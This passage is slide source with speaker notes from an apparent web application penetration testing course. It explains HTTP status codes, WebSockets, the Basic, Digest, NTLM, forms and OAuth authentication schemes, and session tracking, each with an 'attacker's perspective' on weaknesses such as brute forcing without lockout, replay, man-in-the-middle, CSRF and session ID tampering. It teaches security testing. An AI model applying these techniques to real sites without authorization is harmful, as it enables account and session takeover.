	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
Next we will discuss status codes

---

# HTTP Status Codes

- Numeric Code to identify the response type
- Five classes

	- 1xx Informational
		- 100 Continue
		- 101 Switching Protocols
	- 2xx Success
		- 200 OK
	- 3xx Redirection
		- 302 Redirect
		- 304 Not Modified

<!--TODO Consider splitting to multiple columns-->

	- 4xx Client Error
		- 401 Unauthorized
		- 404 File not found
	- 5xx Server Error
		- 500 Server Error
		- 502 Bad Gateway

Note:
HTTP status codes are numeric codes returned by the server as a result of a client request.  These codes are then used by the client to determine what to do with the resulting data.

The 1xx class of status codes are informational.  The 100 status codes were added in HTTP 1.1, so servers cannot send them to HTTP 1.0 clients.  One example of an interesting 1xx response is 101 Switching Protocols used in websockets.

2xx status codes signify a successful result.  In static web sites, this meant the page requested was found, and you have permission to access it.  Now, with so much dynamic content on the web, most errors are displayed within the resulting html.  This means that even though your script or attack tool received a 200 status code, the result may be an error.  Good tools take this into account.

The 3xx class of status codes occur when the server requires the client to look elsewhere for the requested page.  For example, a server administrator can configure redirects if the site has been redesigned and moved around.  This will enable people that have older bookmarks or search results to find what they were looking for.

Another time you see redirects is after a page processes the request.  For example, a site can require a user to complete a login form and then, after authentication, redirect the user to the resources they originally requested.

One thing to be careful of when testing for vulnerabilities is receiving a 304 status and loading the content from the cache.  This may cause you to think the vulnerability doesn't exist.

The 4xx class of status codes is used when the server has received a request that it cannot process due to an error from the client.  For example, if you request a page that does not exist, the server will return a 404 Not Found status code.  If the page you requested requires authentication, it would return a 401 Authentication Required status code.

5xx class of status codes are returned when the server cannot fulfill a request, due to an error on the server side. For example, if an application attempts to connect to a back end data store and cannot, a 5xx status code would result.

Quite often, these errors will contain a wealth of information, from data store types to path disclosure.  Smart attackers will often try to force these errors just to discover the information.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- ***WebSockets***
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
We will now explore a newer technology, WebSockets.

---

# WebSockets

- One of our favorite new technologies is WebSockets
	- http://dev.w3.org/html5/websockets/
- WebSockets are designed to establish connections to a back end server
	- Allows for long term communication between the server and the client
- Support bi-directional communication over a ***single*** TCP socket
- Designed to deal with blocked ports and network restrictions

<!--TODO Position in lower-right corner-->
![](https://www.w3.org/html/logo/downloads/HTML5_Logo.svg)

Note:
WebSockets is a new technology added with HTML5.  It allows for the developer to initiate bidirectional communications over a single TCP socket.  This is great for when an application needs real-time or regular communications.  It also helps support the client heavy web applications being developed today.  

Keep in mind that websockets are still being standardized and that they are not yet very common in web applications being tested, but this is expected to change soon.

---

# WebSockets Implementation

- WebSockets depend on the server and the client
	- JavaScript/HTML5 and custom servers
- A handshake happens via HTTP(S)
	- *101 Switching Protocols* response instructs the browser
- ws:// protocol handler initiates the request
	- wss:// for secure websockets

```js
// Create connection with subprotocols specified  
var connection = new WebSocket('ws://ws.PEWAPT101.org/echo', ['soap', 'xmpp']);

// Send text message
connection.send("PEWAPT101 WS Client");
```

Note:
When we find websockets being used in a web application, it is typically within a .js file, but can be found on the HTML page itself in a &lt;script&gt; block.  We will see a new WebSocket object being created with the following code:

*var connection = new WebSocket('ws://ws.PEWAPT101.org/echo', ['soap', 'xmpp']);*

This creates the object talking to the *echo* function on *ws.PEWAPT101.org*.  It also sets up that the protocols supported over this connection are SOAP and XMPP.  The first is a web service protocol and the second is Jabber.

We can then see that the application uses the *send* function to send a message to the WebSocket server.

---

# WebSocket Tools

- Many tools we use commonly can't handle WebSockets
	- To capture, intercept or fuzz
- WireShark can capture the raw network traffic
	- Sniffing the network communication
- OWASP's Zed Attack Proxy (ZAP) can intercept and fuzz WebSockets
	- Allowing us to test the functionality

Note:
Many of the tools we currently use in web penetration testing do not yet understand or handle the WebSocket communication.  This means that we will fail to intercept or capture this communication path, leaving gaps in our assessment of the web application.

We do have two tools that will handle it currently.  The first is WireShark, which captures the raw network traffic.  We can then try to analyze it.  This is limited due to the fact that much of the WebSocket communication is encrypted.  We can also use OWASP's ZAP interception tool.  Since this basically man in the middle's the traffic, the encryption is not an issue any longer.

---

# Attacker's Perspective of HTTP

- Look for methods that shouldn't be supported
	- PUT, DELETE, CONNECT
- TRACE helps map the architecture
- Check for method interchange
	- The application may support making GET requests where it typically uses POST
		- Many applications do this, especially older or poorly coded PHP apps
	- Eases XSS attacks and scripting because all parameters can be passed right on the URL
		- GET requests tend to be simpler than POST requests

Note:
Knowing what methods are supported by an application helps you plan your attack.  It also will assist in mapping out the architecture of the network. For example, TRACE will show you certain intermediary devices.

You can also determine if method interchange is possible.  Method interchange is when an application accepts its parameters from a GET even though the application was written to use POST.  This can help an attacker both in scripting against an application and when trying to fool users into following specially crafted links.

+++

<!-- Consider converting to .svg image?
  -- Add inline image instead of featuring as separate slide? -->
![](assets/day1/039/try-http-get-on-post-app-diagram.png)

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- ***Exercise: Examining HTTP Requests and Responses***
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
Scenario:  In this exercise, you will become acquainted with the various parts of an HTTP request and response as seen by the HTTP server.  Although this may seem trivial, it is important that you fully understand exactly how an HTTP session works and that you thoroughly understand the fundamental parts of the HTTP request / response mechanism.

Objectives: You will examine a generic HTTP request / response session using a network packet sniffing tool, Wireshark.  Because we will be using Wireshark for other exercises, it is important that you become familiar with its user interface and the information that it provides.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- ***Client Authentication***
	- Exercise: Client Authentication
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
Authentication is covered in this next section.  Obviously, authentication is of great interest to an attacker, as it is the way an application verifies the identity of a user.

---

# Client Authentication

- Authentication identifies the user to the application
- Typically a username/password combination
	- Although client-side certificates are available
- Five schemes in common use today on the web:
	- Basic
	- Digest
	- Integrated Windows
	- Forms-based
	- OAuth
- Other more complex schemes exist, but often use these schemes for transportation of authentication information
	- Biometrics, token, custom client application residing on client, custom mobile code pushed to browser, etc.

Note:
Client authentication is how an application verifies the identity of a user.  Most secure application interfaces begin with authentication, so that they can provide the level of access that corresponds to the end-user's privilege.

There are five major authentication schemes.  We are going to explore them in depth over the next few slides.  We will discuss what these authentication methods mean to an attacker.

---

# HTTP Basic Authentication

- RFC 2617 defines modern basic authentication
	- Originally defined in RFC 1945
- Username and password transmitted
- Server uses a "Realm" to identify itself to   
the user
	- Realm is able to be set to anything by the administrator
- Encoded in Base64
	- Takes each three byte chunk and converts it to four printable ASCII characters using character set of 10 numbers, 26 lowercase, 26 upper case, +, and /
	- 10 + 26 + 26 + 2 = 64
	- Pads to 3 bytes using = sign
	- Not encrypted, a very simple obfuscation
	- Numerous free tools, widgets, and websites encode and reverse Base64
- The web server handles the verification
	- Apache uses .htaccess
	- IIS uses local accounts

Note:
Basic authentication was one of the first forms of authentication for the web.  It was defined in RFC 2617 and has a number of problems.  First and foremost, the user name and password are transmitted over the network using a simple Base64 encoding which is trivial to reverse. For the lazy, or smart (you decide), there are many tools and sites that will reverse the encoding with the click of a button.  We will explore some of these over the next few days.

+++

<!-- Add inline image instead of featuring as separate slide? -->
![](assets/day1/043/ios-auth-required-dialog.png)

---

# HTTP Basic Authentication Illustrated

<!-- Consider converting to .svg image? -->
![](assets/day1/044/http-basic-authentication-illustrated.png)

Note:
The above graphic outlines the HTTP "basic" authentication process.

1. Client requests a page.
2. The server sends back a 401 status code, which indicates that the client needs to authenticate.
3. The client sends the request again for the page, but this time includes the authentication information input by the user. The username and password are encoded using BASE64 (not encrypted).

---

# Attacker's Perspective of HTTP Basic Authentication

- Basic Authentication has no concept of:
	- Account lockout
	- Maximum number of login attempts
- Plain text authentication, easily sniffable if not passed via HTTPS
- Can easily be replayed
- Impersonating the website to dupe browsers into providing authentication credentials
- No log out functionality without closing the browser

Note:
One of the reasons that attackers like basic authentication is that it is trivial to decode the username and password, once packets have been captured.   Many of the tools we will use in class have the capabilities to decode this encoded data.

If attackers cannot sniff the traffic, then brute-force attacks are facilitated by the fact that the system has no provision for account lockout.  The attacker is able to send an unlimited number of requests.  The only factors that may prevent this are controls outside of the BASIC authentications system such as web app firewalls or log monitoring which would detect the attack.

---

# HTTP Digest Authentication

- Designed to "fix" Basic authentication
- Similar to Basic Authentication, except:
	- Uses MD5 to send password hashes
	- Has a nonce to use as a salt
- Defined in RFC 2069
- RFC 2069 was replaced by 2617
	- Added security enhancements
		- Quality of Protection (qop) flag
			- The qop flag tells the client how to generate the response hash
		- Client Nonce (cnonce)
			- Provides a unique value to fold into hash algorithm so that hashed password isn't always the same value

Note:
Digest mode authentication is an update to Basic mode. It was an effort to solve the problem of unencrypted authentication data being transmitted over the network.  In Digest mode authentication, the server sends a nonce to the client.  This nonce is used as a salt when the client MD5-hashes the password and sends it back with the username.  This makes it harder for the attacker to capture the password.  However, since the nonce is sent in clear text, an attacker can capture the string and crack it using various publicly-available tools.  

Digest was originally outlined in RFC 2069.  This was updated in RFC 2617 where features such as the quality of protection flag and the client nonce.  In RFC2617 the response generation was outline as described below.  This system is used when qop is set to auth or left blank.

First the client generates hash1 (HA1) by doing an md5 hash of "username:realm:password".

Second the client generates hash2 (HA2) by running an md5 hash of "method:URI".

Finally, the client generates the response hash by running an md5 hash of "HA1:nonce:nonceCount:clientNonce:qop:HA2".

---

# HTTP Digest Authentication Illustrated

<!-- Consider converting to .svg image? -->
![](assets/day1/047/http-digest-authentication-illustrated.png)

Note:
The above graphic outlines the HTTP "digest" authentication process.

	1. Client requests a page.
	2. The server sends back a 401 status code, which indicates that the client needs to authenticate.
	3. The client sends a request again for the page, but this time includes the authentication information based on input by the user.

The big difference between "basic" and "digest" authentication is that with digest authentication, the password is never sent over the wire.

---

# Attacker's Perspective of<br />HTTP Digest Authentication

- Digest has no concept of:
	- Account Lockout
	- Maximum number of login attempts
- Nonce predictability can be a problem
	- This is rare for most modern web servers
- No logout functionality unless browser is closed
- Man-in-the-Middle attacks, in which an attacker:
	- Pretends to be a web site
	- Sends request to the real site and retrieves the nonce
	- Requests authentication from client, using the nonce from the real site
	- Passes authentication response to the real site, gaining access

Note:
For attackers, "digest" authentication is not as desirable as "basic" authentication, because in digest authentication credentials cannot be decoded. However, attackers still like digest authentication because it presents two key vulnerabilities. First, the digest method still does not include a mechanism for account lockout, and second, it is vulnerable to man-in-the-middle attacks.

---

# Integrated Windows Authentication

- Microsoft proprietary authentication
	- IE, Firefox and other browsers support client portion
- Uses Windows OS authentication
	- Challenge-Response protocol
	- NTLM or Kerberos passed across HTTP or HTTPS
		- Kerberos is supported as of IIS 5
- Typically seen in intranets
	- Windows Integrated Authentication requires the client and the server to be in the same or trusted Windows Active Directory domains
- There are Apache modules, but they are not widely supported

Note:
Integrated Windows Authentication (IWA) is specific to Microsoft Windows operating systems and Microsoft's Internet Information Services (IIS).  It leverages authentication which the client operating system has already performed.  When the browser requests a resource, that authentication is passed through to the server which then grants access to the resource.

This method of authentication is typically seen on intranets.

The IWA process is quite simple.

1. The user authenticates to the client machine by logging on.
2. The operating system verifies this authentication with the domain controllers.
3. The user browses to a web site.
4. The server requests authentication.
5. The client then passes the original authentication token to the server.

---

# Integrated Windows Authentication Illustrated

<!-- Consider converting to .svg image? -->
![](assets/day1/050/integrated-windows-authentication-illustrated.png)

Note:
In the LANMAN challenge/response protocol, the server sends a challenge to the client via a 401 response.  The server sets the WWW-Authenticate header to NTLM.  In the subsequent HTTP request, the client sets the response to the NTLM hash.  This is created as outlined before.

The client starts with the LANMAN hash, which is 16 bytes long.  Note that we are talking about the LANMAN *hash* here, which is 16 bytes long, not the original LANMAN *password*, which is up to 14 characters long.  The 16 bytes of the LANMAN hash are padded with fixed padding to make them exactly 21-bytes long.  They are then broken into three seven-character pieces, which we can call LM part 1, LM part 2, and LM part 3.  The third part consists only of the last two bytes of a user's password hash with some padding.  Each of these three seven-byte pieces is used as a DES key to encrypt the challenge, resulting in Response parts 1, 2, and 3.  The response parts are concatenated together and sent to the server.

The exact same process applies for NTLMv1, but it starts with the 16-byte NT hash instead of the 16-byte LANMAN hash.

With either LANMAN challenge/response or NTLMv1, an attacker could sniff both the challenge and response off of the network and try to crack them, guessing, encrypting, and comparing which passwords would yield the sniffed response from the sniffed challenge.  Note that cracking these challenges is more work than cracking LANMAN hashes stored in the SAM database, because more cryptographic operations are required with the DES algorithm applied to three different piece parts of either the LANMAN or NT hashes.

---

# Attacker's Perspective of<br />HTTP Integrated Windows Authentication

- Focus on the client machines
- Always logged on
- This authentication is perfect for Cross-Site Request Forgery (CSRF)
- XSS is also more useful here
	- But not to steal cookies
	- XSS can automate the CSRF attacks

Note:
As with the certificate-based authentication, the attacker focuses on the weak link, which is the client machine.  If the attacker can take control of the client machine or force it to make a request on their behalf, then the attacker can access the web server using the user's credentials.  This type of authentication is perfect for conducting Cross Site Request Forgery attacks, as we will study later.

---

# Forms-based Authentication

- Most common in modern sites
- Uses HTML forms, integrated with normal web pages of application
	- Very user-friendly
- Initial authentication near beginning of session
	- For subsequent requests, some sort of session credential must be established
- Unless HTTPS is used, credentials are transported plain text
- Back-end authentication is limited only by the developer's imagination
	- Typically uses a database or LDAP
- Client side code can also be part of the process

Note:
Forms-based authentication is increasingly common on modern sites.  This occurs when the developer has chosen to use the application to handle authentication instead of relying on the server as the previous methods did.

Forms are very user-friendly as they can be designed to look like the application, instead of using the client's display widgets.

+++

<!-- Add inline image instead of featuring as separate slide? -->
![](assets/day1/052/html-auth-form.png)

---

# Pieces of Forms-based Authentication

- Forms-based logins are made of multiple pieces
	- Form
		- May be on a separate page or part of regular pages
	- Processing code
		- Processing code can be either client or server side code
		- Code can be part of the same page or a separate page on the server
	- Resources that require authentication
		- Commonly ignored by developers
		- Testers should attempt to access the resources directly

Note:
Three pieces make up a forms-based authentication system:

	- Login form – This is the web form that accepts the username and password.
	- Processing page – This page processes the authentication attempt.  It may be part of the same page or a separate page entirely.
	- Resource – Authentication serves no purpose if there isn't a resource that requires it before allowing access.

Forms-based authentication follows the process listed below:

1. A client requests a page.
2. The server responds with a page that includes a form (HTML, Flash, Java applet or other form type).
3. The user fills out the form.
4. The browser submits the page to the application, including the information from the user.
5. This response is processed by the application.
6. Either an error page or the resource requested is returned to the client.

---

# Forms-based Authentication Illustrated

<!-- Consider converting to .svg image? -->
![](assets/day1/054/html-auth-form.png)

Note:
As is shown in this diagram, the user is presented with a HTML form.  They fill in the items requested, typically username and password.  This form is then submitted to the processing code, which can be a part of the same or separate page.  The processing code then connects to the back end data source and validates the authentication information.

---

# Attacker's Perspective of Forms-based Authentication

- Only as secure as the developer makes it
	- Or the underlying development environment, provided that the developer doesn't break or inadvertently circumvent its security measures
- Account lockout typically doesn't exist
- Check for injection vulnerabilities
	- SQL injection
	- XSS to redirect users
- Capturing the authentication token
	- Session
	- Cookie
	- Others …
- Spoofing the site is possible
	- Phishing attacks are an example of this

Note:
Attackers are excited to discover sites which rely upon forms-based authentication, because the developer is responsible for implementing security. As a result, the security of sites which rely upon forms-based authentication is inconsistent, and often vulnerabilities can be found.

Most injection attacks can be used against vulnerable forms-based authentication, and if the authentication token can be captured, the attacker has access to the site.

---

# OAuth

- OAuth doesn't actually authenticate users
	- It delegates access to third-parties
	- Designed to avoid giving your password to third-parties
		- Often used by social media clients for access to Twitter, Facebook, etc.
- Three parties to an oAuth transaction
	- The user:  Us
	- The consumer:  Twitteriffic
	- The service provider:  Twitter

Note:
OAuth was built to solve the problem of third party applications connecting to service providers on our behalf, but without giving them our credentials to the service provider.  OAuth is heavily used in mobile applications and desktop applications, but it is also used from one web application to another.

---

# How OAuth Works - Part 1

<!-- Consider converting to .svg image? -->
![](assets/day1/057/how-its-made-oauth-ed-pt1.png)

Note:
Bob wants to use the fictional pro.evil Twitter application to post to his Twitter feed.  He uses the pro.evil application and tells it he wants it to interact on his behalf with Twitter.  

pro.evil asks Twitter for a request token.  Twitter sends back a request token and a secret for pro.evil to use. pro.evil uses this secret to sign each request it sends to Twitter so that Twitter can verify that the request is valid and not forged by someone else.

---

# How OAuth Works - Part 2

<!-- Consider converting to .svg image? -->
![](assets/day1/058/how-its-made-oauth-ed-pt2.png)

Note:
pro.evil sends the request token to Bob and tells him to take it to Twitter and approve access for pro.evil.  pro.evil then redirects Bob to Twitter to approve the access.

Bob tells Twitter that he wants to approve access for pro.evil.  Twitter confirms that Bob really wants pro.evil to be able to perform a number of actions on his behalf.  When Bob confirms the authorization to access his account, Twitter tells Bob that he needs to inform pro.evil that they can now use the request token.

---

# How OAuth Works – Part 3

<!-- Consider converting to .svg image? -->
![](assets/day1/059/how-its-made-oauth-ed-pt3.png)

Note:
Bob tells pro.evil that the request token is ready to go.

pro.evil then asks Twitter to exchange the request token for an access token.  Twitter checks to make sure that the request token has been authorized by Bob.  If so, Twitter sends back an access token and secret to pro.evil to use when posting to Bob’s Twitter feed.

pro.evil then sends a request to Twitter to be posted on Bob’s feed, sending along the access token and signing it with the secret.  Twitter verifies that the signature on the access token is valid and posts the requested data to Bob’s feed.

---

# OAuth 1.0

- OAuth 1 makes extensive use of signatures to validate requests
	- However the complexity of generating and validating signatures caused enough complaints that a second version was created
	- Doesn’t require SSL
	- Tokens do not expire
	- Depends on the token secret remaining secret for security

Note:
OAuth 1.0 depends on the integrity of the secret key to ensure that messages are not spoofed.  There is no requirement for transport encryption and tokens do not expire.  So the protecting the secret key is the major priority.

---

# OAuth 2.0

- OAuth 2.0 was created in response to complaints about the complexity of 1.0
	- Requires SSL for all communications to generate a token
	- Signatures are not required for API calls once the token is generated
		- SSL strongly recommended
	- Only one token is sent in an API call and no signatures sent
	- Tokens have an expiration time

Note:
OAuth 2.0 adds token expiration and SSL communication requirements to protect tokens.  Even if a token is intercepted, it will have a limited lifespan before it is automatically replaced.  However, the renewal process must be implemented properly or the security of this version falls apart.

---

# Example OAuth Requests

## OAuth 1.0 Request

```http
GET /rest/api/events/dummyChange HTTP/1.1
Host: www.example.com
Content-Type: application/xml
Authorization: OAuth realm="",
oauth_nonce="72250489",
oauth_timestamp="1294966759",
oauth_consumer_key="Dummy",
oauth_signature_method="HMAC-SHA1",
oauth_version="1.0",
oauth_signature="IBlWh0m3PuDwaSdxE/Qu4RKPtVE="
```

## OAuth 2.0 Request

```http
GET /oauth2/v1/userinfo HTTP/1.1
Authorization: Bearer 1/fFBGRNJru1FQd44AzqT3Zg
Host: example.com
```

Note:
Note the amount of information that needs to be checked in an OAuth 1.0 request.  Signatures need to be calculated and verified on the server to make sure that a request is not forged.  An OAuth 2.0 is much simpler to parse, but needs to handle securely regenerating access tokens when they expire.

---

# Attacker's View of OAuth

- Want to find out the secret key for OAuth 1 
	- Insecure storage of the key
	- Intercept the generation of request and access tokens (No SSL required)
	- Vulnerabilities in the service provider application may disclose the secret key
- OAuth 1.0 tokens never expire
- Security of OAuth is highly dependent on the consumer application to get the implementation right
- Deployment of OAuth 1.0 vs. 2.0 is mixed
	- Some sites continue to use 1.0 while others have moved to 2.0
- Check for information leakage in JavaScript
	- Sensitive information such as the secret key may be present
- Spoofing the site is possible
	- Evil consumer application pops up something that looks like the intended service provider web site with the intent of stealing username and password

Note:
As with forms based authentication, the developers are responsible for properly implementing the security with an OAuth deployment.  Misconfiguration, poor implementation and information leakage may all yield valuable information in testing.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- ***Exercise: Client Authentication***
	- Session Tracking
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
Scenario:  In this exercise, you will become acquainted with the various types of authentication that can be used over HTTP.  As a web application penetration tester, it is important that you have a solid understanding of how these authentication schemes work, as well as an appreciation of their strengths and weaknesses.

Objectives: You will examine the data being transmitted to and from the server during a Basic Authentication session, a Digest Authentication session, and a Form authentication session using a man-in-the-middle proxy tool, Paros.  Paros has many uses in web application testing and it is important that you become familiar with its user interface and the information that it provides.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- ***Session Tracking***
	- HTTPS
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
This next section will cover session state and how a web application tracks requests.

---

# Stateless as a Way of Life

- HTTP is stateless
	- The application must implement a method for grouping a series of requests together in a session
	- The application implements a state tracking mechanism
- Server-side code has to identify that each request is part of the same session
	- Most languages have built-in support for sessions
	- Some developers "roll" their own session-tracking code

Note:
HTTP is a stateless protocol. This means that the application must maintain a method of identifying requests as being part of the same session. 

Servers must have a way to identify individual requests as being part of a longer session.  Otherwise, many applications would not be able to keep track of the data used to provide functionality.

Most web languages have built in session management and these are the recommended way to maintain session state.  They have been tested and when errors are found, mostly, they are fixed.  When developers get fancy and create their own session management system, they often miss something.  In these cases, the attacker has an opportunity to break the application.

Popular methods include cookies, URL parameters and hidden form fields.

---

# Session Tracking

- Server-side code uses some form of data stored at the browser to track sessions
	- The server code then tracks this data between requests
	- Data is passed between the client and the server
	- Typically the data is some form of identifier
- The server can set whatever data it wants
	- May even send all session variables
- The client is trusted to send the data back unchanged

Note:
To track sessions, a token, numeric identifier or other unique information is passed between the client and the server.

Usually, applications use a single identifier as the token, session id or numeric data in order to track sessions.  That said, the developer of the application is free to use whatever they like.  For example, some developers pass every piece of information they need to the client and back again.  Of course, they trust that the client will not change this data before sending it back to the server. (Insert evil laugh here.)

---

# Types of Sessions:<br />Client-side vs. Server-side

Note:
All of these mechanisms for passing session state are used to support one of two types of sessions:
- Client-Side
- Server-Side

+++

# Types of Sessions
## Client-side

All session data is sent to the client
- Very nice for the attacker, because any variables can be altered
- The application trusts the client not to alter these variables

<!-- Consider converting to .svg image? -->
![](assets/day1/068/client-side-session-diagram.png)

Note:
Client-side:  
In client-side sessions, the application sends all the session data to the client and the client sends it back unchanged.  This lowers the overhead on the server and enables the application to be load-balanced across multiple servers, without having to be specially configured to support persistent sessions across the various servers.

Client-side sessions bode well for attackers, since the server trusts the client completely.

+++

# Types of Sessions
## Server-side

Session is maintained on the server
	- Session ID matched to server data
	- This one variable can still be altered

<!-- Consider converting to .svg image? -->
![](assets/day1/068/server-side-session-diagram.png)

Note:
Server-side:  
In server-side sessions, all of the session data is stored on the server.  A session ID is passed between the client and the server.  Sometimes, the server will still pass the session data to the client for GUI support or user friendliness, but in secure applications this data is untrusted when it is returned and verified against the server version.

---

# Popular Tracking

- Session data is important, but how do we track
- Typically a session token is passed to and from the client
- Popular methods for tracking state
	- Cookies
	- URI Parameters
	- Hidden Form Fields
- As testers, we need to evaluate these tokens

Note:
Session data is important, but how do we track this session across requests? The platform usually provides us a means but the application may over ride it or use its own method.

Typically a session token is passed to and from the client which the server/application then uses to map to the session data stored on the server.

Popular methods for tracking state:
- Cookies
- URI Parameters
- Hidden Form Fields

As testers, we need to evaluate these tokens for problems or predictability.

---

# Cookies

- Cookies are data pieces that are sent to the browser by the server
	- Sent as part of the HTTP Header
	- Browser is supposed to store them without alteration, blindly passing them back to the server
	- Can be marked as “Secure”
		- This tells the browser to send the cookie only via HTTPS connections
	- Also marked with an indication for how long to store
		- Could be stored for no time, making for non-persistent cookies, stored in browser memory, disappearing when browser is closed
- As part of the request, the client will send the data back
- This allows the server to identify users and/or sessions
- A single domain is typically limited to 50 cookies
	- Under 4KB total
- For example:
	- `Set-Cookie: USERID=kevin; expires=Fri, 27-Feb-2021; path=/; domain=.secureideas.com`

Note:
A cookie is just a snippet of data that is sent from the server to the client, stored on the client, and sent back to the server upon request.  These cookies can be stored in memory or written to disk, depending on the developer's purpose.  Often, this information is just a session identifier, but quite often this data is more informative.  For example, the application can store your user name, so that the next time you visit, it will recognize you.

---

# URI Parameters

- Data is placed in the URI of links
	- Param=value format
- When a user clicks on a link, the browser sends the data in the URI back to the server
	- It sends this data in an HTTP GET request
- For example:
	- http://www.secureideas.com/index.php?sessionid=124534
- As mentioned earlier, separate parameters are separated by & symbols

Note:
Another method of passing session tokens between the server and the client is by placing them in the URI.  Either the session token itself, or the actual session data, can be included in parameters and inserted into each of the links on the page, before the page is sent to the client.

---

# Hidden Form Fields

- Forms are used for user input
	- But they can also be pre-populated the server in the response it sends back to the browser
- Form fields that are marked “hidden” are not displayed to the user
	- Forms can have a mixture of visible and hidden fields…
	- …Or, they can have entirely hidden fields
	- User doesn't see form, but its values are passed back to the server as part of the next request
- For example, the source HTML may contain:

```html
<input type="hidden" name="username" value="c_smith">
```

Note:
As applications are built, forms are used to accept input from the user.  These forms can also include hidden form fields which contain the information that the application needs passed across the session.  Typically, we see significant information being stored in hidden form fields.  Of course, this is an example of the developer trusting that all of their users are gruntled.

---

# Attacker's Perspective of<br />Session State

- Session state is a major target
- Multiple tools are used to attack session
	- Interception proxies provide access to sessions
	- Scripts to brute force session IDs
- Changing session ID can:
	- Give attacker access as someone else
	- Disclose sensitive information
	- Elevate attacker's privileges
	- Much more!

Note:
Session state is one of the primary attack targets for web applications. If an attacker can find an session state issue, many attack vectors are opened.  For example, we could hijack someone else's session and perform functions as them, with their credentials.  Or, we could modify the session state to indicate administrator-level privilege within the application.

---

# Course Roadmap

<!--TODO Left <div> of slide-->
<div>

- ***Attacker's View, Pen-Testing, & Scoping***
- Recon & Mapping
- Application Discovery
- Application Discovery Cont.
- Exploitation
- Capture the Flag

</div>

<!--TODO Right <div> of slide-->
<div>

- Why the Web?
- Web App Pen Testing
- Web Site Server Architecture
- The HTTP Protocol
	- HTTP Methods
	- HTTP Status Codes
	- WebSockets
	- Exercise: Examining HTTP Requests and Responses
	- Client Authentication
	- Exercise: Client Authentication
	- Session Tracking
	- ***HTTPS***
	- Exercise: Analyzing HTTPS
- SamuraiWTF
- Penetration Testing Types and Methods
- Web App Pen Test Components
- Reporting and Presenting Findings
- Attack Methodology
- Types of Flaws
- JavaScript for Pen Testers
	- Statements, Variables, Functions, & Events
	- The DOM, Methods, and Properties
	- AJAX and XMLHttpRequest
	- JavaScript Exercise

</div>

Note:
This next section covers Transport Layer Security (TLS, formerly Secure Socket Layer (SSL)).  This is a mechanism for encrypting HTTP traffic.  While SSL/TLS provides protection from eavesdropping, it also allows attackers to interact with the web application without their content being captured by most network monitors.

